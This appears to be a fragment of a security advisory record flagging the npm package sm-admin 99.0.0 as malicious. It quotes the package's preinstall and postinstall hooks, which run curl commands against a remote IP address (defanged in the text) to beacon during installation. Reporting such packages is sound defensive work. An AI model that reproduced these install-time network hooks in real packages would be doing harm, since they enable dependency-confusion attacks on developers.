  "summary": "Malicious code in sm-admin (npm)",
  "details": "Sm-admin@99.0.0 (version 99.0.0, a dependency-confusion-shaped name) runs two install-time network beacons: its preinstall hook executes `curl -s hxxp://16[.]192[.]173[.]5/sm-admin/pre` and its postinstall hook executes `curl -s hxxp://16[.]192[.]173[.]5/sm-admin/post`, both fetching from the remote host 16[.]192[.]173[.]5 during package installation. The package ships no functional code (a 157-byte index.js that only logs a message).",
